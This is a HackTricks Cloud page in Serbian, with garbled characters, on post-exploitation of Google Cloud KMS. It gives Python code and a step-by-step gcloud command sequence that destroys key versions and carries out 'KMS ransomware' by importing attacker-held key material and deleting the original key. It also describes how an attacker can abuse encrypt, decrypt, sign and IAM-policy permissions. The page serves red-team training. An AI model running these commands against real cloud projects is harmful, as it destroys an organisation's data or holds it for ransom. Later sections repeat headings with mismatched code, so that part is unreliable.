# GCP - KMS Post Exploitation

{% hint style="success" %}
Nau캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## KMS

Prona캠ite osnovne informacije o KMS-u u:

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

### `cloudkms.cryptoKeyVersions.destroy`

Napada캜 sa ovom dozvolom mo쬰 uni코titi KMS verziju. Da biste to uradili, prvo morate onemogu캖iti klju캜, a zatim ga uni코titi:
```python
# pip install google-cloud-kms

from google.cloud import kms

def disable_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Disables a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to disable the key version.
client.update_crypto_key_version(request={'crypto_key_version': {'name': key_version_name, 'state': kms.CryptoKeyVersion.State.DISABLED}})

def destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Destroys a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to destroy the key version.
client.destroy_crypto_key_version(request={'name': key_version_name})

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'  # Version number to disable and destroy

# Disable the key version
disable_key_version(project_id, location_id, key_ring_id, key_id, key_version)

# Destroy the key version
destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version)
```
### KMS Ransomware

U AWS-u je mogu캖e potpuno **ukrasti KMS klju캜** modifikovanjem KMS resursne politike i omogu캖avanjem samo napada캜evom nalogu da koristi klju캜. Po코to ove resursne politike ne postoje u GCP-u, ovo nije mogu캖e.

Me캠utim, postoji drugi na캜in da se izvede globalni KMS Ransomware, koji bi uklju캜ivao slede캖e korake:

* Kreirajte novu **verziju klju캜a sa klju캜nim materijalom** koji je napada캜 uvezao

{% code overflow="wrap" %}
```bash
gcloud kms import-jobs create [IMPORT_JOB] --location [LOCATION] --keyring [KEY_RING] --import-method [IMPORT_METHOD] --protection-level [PROTECTION_LEVEL] --target-key [KEY]
```
{% endcode %}

* Postavite ga kao **podrazumevanu verziju** (za budu캖e podatke koji se 코ifruju)
* **Ponovo 코ifrujte starije podatke** 코ifrovane prethodnom verzijom sa novom.
* **Obri코ite KMS klju캜**
* Sada samo napada캜, koji ima originalni materijal klju캜a, mo쬰 da de코ifruje 코ifrovane podatke

#### Ovde su koraci za uvoz nove verzije i onemogu캖avanje/brisanje starijih podataka:
```bash
# Encrypt something with the original key
echo "This is a sample text to encrypt" > /tmp/my-plaintext-file.txt
gcloud kms encrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--plaintext-file my-plaintext-file.txt \
--ciphertext-file my-encrypted-file.enc

# Decrypt it
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -


# Create an Import Job
gcloud kms import-jobs create my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--import-method "rsa-oaep-3072-sha1-aes-256" \
--protection-level "software"

# Generate key material
openssl rand -out my-key-material.bin 32

# Import the Key Material (it's encrypted with an asymetrict key of the import job previous to be sent)
gcloud kms keys versions import \
--import-job my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--algorithm "google-symmetric-encryption" \
--target-key-file my-key-material.bin

# Get versions
gcloud kms keys versions list \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key

# Make new version primary
gcloud kms keys update \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--primary-version 2

# Try to decrypt again (error)
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -

# Disable initial version
gcloud kms keys versions disable \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key 1

# Destroy the old version
gcloud kms keys versions destroy \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--version 1

```
### `cloudkms.cryptoKeyVersions.useToEncrypt` | `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation`

Ove uloge omogu캖avaju napada캜u da 코ifruje podatke koriste캖i KMS klju캜eve. Ovo mo쬰 biti korisno za napada캜a da sakrije tragove ili da 코ifruje ukradene podatke pre nego 코to ih iznese iz okru쬰nja.

### `cloudkms.cryptoKeyVersions.useToDecrypt` | `cloudkms.cryptoKeyVersions.useToDecryptViaDelegation`

Ove uloge omogu캖avaju napada캜u da de코ifruje podatke koji su 코ifrovani KMS klju캜evima. Ako napada캜 ima pristup ovim ulogama, mo쬰 de코ifrovati poverljive informacije i koristiti ih za dalju eksfiltraciju ili zloupotrebu.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

Ova uloga omogu캖ava napada캜u da vidi javni klju캜 asimetri캜nog KMS klju캜a. Iako ovo samo po sebi nije dovoljno za de코ifrovanje podataka, mo쬰 biti korisno u kombinaciji sa drugim informacijama koje napada캜 poseduje.

### `cloudkms.cryptoKeyVersions.view`

Ova uloga omogu캖ava napada캜u da vidi metapodatke o verzijama KMS klju캜eva. Ovo mo쬰 uklju캜ivati informacije kao 코to su status klju캜a, datum kreiranja i datum isteka, 코to mo쬰 pomo캖i napada캜u da bolje razume kako su klju캜evi kori코캖eni i da planira dalji napad.
```python
from google.cloud import kms
import base64

def encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext):
"""
Encrypts data using a symmetric key from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key name.
key_name = client.crypto_key_path(project_id, location_id, key_ring_id, key_id)

# Convert the plaintext to bytes.
plaintext_bytes = plaintext.encode('utf-8')

# Call the API.
encrypt_response = client.encrypt(request={'name': key_name, 'plaintext': plaintext_bytes})
ciphertext = encrypt_response.ciphertext

# Optional: Encode the ciphertext to base64 for easier handling.
return base64.b64encode(ciphertext)

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
plaintext = 'your-data-to-encrypt'

ciphertext = encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext)
print('Ciphertext:', ciphertext)
```
### `cloudkms.cryptoKeyVersions.useToSign`

Ova dozvola omogu캖ava napada캜u da koristi klju캜 za potpisivanje podataka. Ovo mo쬰 biti korisno za napada캜a da potpi코e zlonamerne transakcije ili dokumente kako bi izgledali legitimno.

### `cloudkms.cryptoKeyVersions.useToDecrypt`

Ova dozvola omogu캖ava napada캜u da de코ifruje podatke koji su 코ifrovani pomo캖u odre캠enog klju캜a. Ako napada캜 ima pristup 코ifrovanim podacima i odgovaraju캖em klju캜u, mo쬰 dobiti pristup osetljivim informacijama.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

Ova dozvola omogu캖ava napada캜u da vidi javni klju캜 povezan sa privatnim klju캜em. Iako javni klju캜 sam po sebi nije osetljiv, mo쬰 se koristiti u kombinaciji sa drugim informacijama za napade.

### `cloudkms.cryptoKeys.getIamPolicy`

Ova dozvola omogu캖ava napada캜u da dobije IAM politiku povezanu sa klju캜em. Ovo mo쬰 pomo캖i napada캜u da identifikuje druge korisnike ili servise koji imaju pristup klju캜u i potencijalno iskoristi te informacije za dalji napad.

### `cloudkms.cryptoKeys.setIamPolicy`

Ova dozvola omogu캖ava napada캜u da postavi IAM politiku za klju캜. Napada캜 mo쬰 dodati sebe ili druge zlonamerne korisnike kao korisnike sa visokim privilegijama, 캜ime se omogu캖ava dalji pristup i eksploatacija.
```python
import hashlib
from google.cloud import kms

def sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message):
"""
Sign a message using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Call the API to sign the digest.
sign_response = client.asymmetric_sign(name=key_version_name, digest=digest)
return sign_response.signature

# Example usage for signing
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'
message = 'your-message'

signature = sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message)
print('Signature:', signature)
```
### `cloudkms.cryptoKeyVersions.useToVerify`

Ova dozvola omogu캖ava napada캜u da koristi klju캜 za verifikaciju podataka. Ovo mo쬰 biti korisno u scenarijima gde napada캜 쬰li da proveri autenti캜nost podataka ili poruka.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

Ova dozvola omogu캖ava napada캜u da vidi javni klju캜 povezan sa odre캠enim CryptoKeyVersion. Javni klju캜evi se mogu koristiti za enkripciju podataka koji se kasnije mogu dekriptovati privatnim klju캜em.

### `cloudkms.cryptoKeyVersions.useToEncrypt`

Ova dozvola omogu캖ava napada캜u da koristi klju캜 za enkripciju podataka. Ovo mo쬰 biti korisno za za코titu podataka koje napada캜 쬰li da sa캜uva ili prenese.

### `cloudkms.cryptoKeyVersions.useToDecrypt`

Ova dozvola omogu캖ava napada캜u da koristi klju캜 za dekripciju podataka. Ovo je kriti캜no jer omogu캖ava napada캜u pristup 코ifrovanim informacijama.

### `cloudkms.cryptoKeyVersions.destroy`

Ova dozvola omogu캖ava napada캜u da uni코ti odre캠eni CryptoKeyVersion. Uni코tavanje klju캜eva mo쬰 dovesti do gubitka pristupa 코ifrovanim podacima, 코to mo쬰 biti 코tetno za organizaciju.

### `cloudkms.cryptoKeyVersions.restore`

Ova dozvola omogu캖ava napada캜u da povrati prethodno uni코teni CryptoKeyVersion. Ovo mo쬰 biti korisno ako napada캜 쬰li da povrati pristup podacima koji su bili 코ifrovani tim klju캜em.
```python
from google.cloud import kms
import hashlib

def verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature):
"""
Verify a signature using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Build the verify request and call the API.
verify_response = client.asymmetric_verify(name=key_version_name, digest=digest, signature=signature)
return verify_response.success

# Example usage for verification
verified = verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature)
print('Verified:', verified)
```
{% hint style="success" %}
Nau캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hacking trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
